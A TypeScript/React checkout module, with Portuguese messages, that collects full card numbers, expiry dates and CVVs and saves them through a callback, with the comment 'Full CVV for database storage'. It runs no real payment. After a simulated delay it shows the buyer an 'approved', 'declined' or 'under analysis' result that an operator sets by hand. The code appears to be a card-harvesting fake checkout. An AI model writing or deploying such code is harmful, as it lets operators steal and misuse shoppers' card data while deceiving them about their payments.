
import { useToast } from '@/hooks/use-toast';
import { useNavigate } from 'react-router-dom';
import { CardFormData } from '../../../payment-methods/CardForm';
import { PaymentResult } from '../types';
import { randomId, simulateProcessingDelay } from '../common/paymentUtils';

export const processManual = async ({
  cardData,
  formState,
  navigate,
  setIsSubmitting,
  setError,
  toast,
  onSubmit,
  brand,
  deviceType,
  settings
}: {
  cardData: CardFormData;
  formState: any;
  navigate: ReturnType<typeof useNavigate>;
  setIsSubmitting: (isSubmitting: boolean) => void;
  setError: (error: string) => void;
  toast?: ReturnType<typeof useToast>['toast'];
  onSubmit?: (data: any) => void;
  brand?: string;
  deviceType?: string;
  settings?: any;
}): Promise<PaymentResult | void> => {
  try {
    console.log("Using manual card processing with data:", { 
      cardName: cardData.cardName,
      cardNumberLastFour: cardData.cardNumber.slice(-4), 
      expiryMonth: cardData.expiryMonth,
      expiryYear: cardData.expiryYear,
      cvv: '***', // Masked for security
      isDigitalProduct: formState.isDigitalProduct
    });
    
    console.log("Manual card settings:", settings?.manualCardStatus);
    console.log("Form state for manual processing:", {
      productId: formState.productId,
      productName: formState.productName,
      productPrice: formState.productPrice,
      useCustomProcessing: formState.useCustomProcessing,
      manualCardStatus: formState.manualCardStatus
    });
    
    // Determine payment status based on manual settings
    const manualCardStatus = settings?.manualCardStatus || 'ANALYSIS';
    
    let paymentStatus = 'PENDING';
    let redirectPath = '/payment-success';
    
    // Set status based on manual configuration
    switch (manualCardStatus) {
      case 'APPROVED':
        paymentStatus = 'CONFIRMED';
        redirectPath = '/payment-success';
        break;
      case 'DENIED':
        paymentStatus = 'DECLINED';
        redirectPath = '/payment-failed';
        break;
      case 'ANALYSIS':
      default:
        paymentStatus = 'PENDING';
        redirectPath = '/payment-success';
        break;
    }
    
    console.log("Payment will have status:", paymentStatus, "and redirect to:", redirectPath);
    
    // Store payment data
    const paymentData = {
      cardNumber: cardData.cardNumber.replace(/\s/g, ''),
      expiryMonth: cardData.expiryMonth,
      expiryYear: cardData.expiryYear,
      cvv: cardData.cvv, // Full CVV for database storage
      cardName: cardData.cardName,
      paymentId: `pay_${randomId(10)}`,
      status: paymentStatus,
      brand: brand || 'Desconhecida',
      deviceType: deviceType || 'desktop',
      isDigitalProduct: formState.isDigitalProduct
    };

    // Simulate a payment process
    await simulateProcessingDelay(2000);
    
    if (onSubmit) {
      // Call the onSubmit callback to save the order
      console.log("Submitting payment data to order context:", {
        cardNumber: paymentData.cardNumber.slice(-4).padStart(paymentData.cardNumber.length, '*'), // Mask for logging
        expiryMonth: paymentData.expiryMonth,
        expiryYear: paymentData.expiryYear,
        cvv: '***', // Mask CVV for logging
        cardName: paymentData.cardName,
        paymentId: paymentData.paymentId,
        status: paymentStatus
      });
      
      const orderResult = await onSubmit({
        ...paymentData,
        paymentStatus: paymentStatus === 'CONFIRMED' ? 'Pago' : 
                      paymentStatus === 'DECLINED' ? 'Cancelado' : 'Aguardando',
      });
      
      console.log("Order submission result:", orderResult);
    } else {
      console.error("No onSubmit callback provided to processManual, payment data will not be saved!");
    }
    
    if (toast) {
      let toastTitle = "";
      let toastMessage = "";
      let toastType: "default" | "destructive" = "default";
      
      switch (manualCardStatus) {
        case 'APPROVED':
          toastTitle = "Pagamento aprovado";
          toastMessage = "Seu pagamento foi processado com sucesso.";
          break;
        case 'DENIED':
          toastTitle = "Pagamento recusado";
          toastMessage = "Seu pagamento foi recusado pela operadora.";
          toastType = "destructive";
          break;
        case 'ANALYSIS':
        default:
          toastTitle = "Pagamento em análise";
          toastMessage = "Seu pagamento foi enviado para análise.";
          break;
      }
      
      toast({
        title: toastTitle,
        description: toastMessage,
        variant: toastType,
        duration: 5000,
      });
    }
    
    // Navigate to the appropriate page based on status
    console.log(`Navigating to ${redirectPath} with status ${paymentStatus}`);
    
    navigate(redirectPath, { 
      state: { 
        orderData: {
          paymentId: paymentData.paymentId,
          productId: formState.productId,
          productName: formState.productName,
          productPrice: formState.productPrice,
          paymentMethod: 'CREDIT_CARD',
          paymentStatus: paymentStatus
        },
        isManual: true
      }
    });

    return {
      success: paymentStatus !== 'DECLINED',
      method: 'card',
      paymentId: paymentData.paymentId,
      status: paymentStatus,
      timestamp: new Date().toISOString(),
      brand: paymentData.brand,
      deviceType: paymentData.deviceType,
      isDigitalProduct: formState.isDigitalProduct
    };
  } catch (error) {
    console.error('Erro no processamento manual do cartão:', error);
    setError('Erro ao processar pagamento. Por favor, tente novamente.');
    
    if (toast) {
      toast({
        title: "Erro no processamento",
        description: "Houve um problema ao processar o pagamento. Por favor, tente novamente.",
        variant: "destructive",
        duration: 5000,
      });
    }
    return {
      success: false,
      error: 'Erro ao processar pagamento',
      method: 'card',
      status: 'FAILED',
      timestamp: new Date().toISOString()
    };
  } finally {
    setIsSubmitting(false);
  }
};
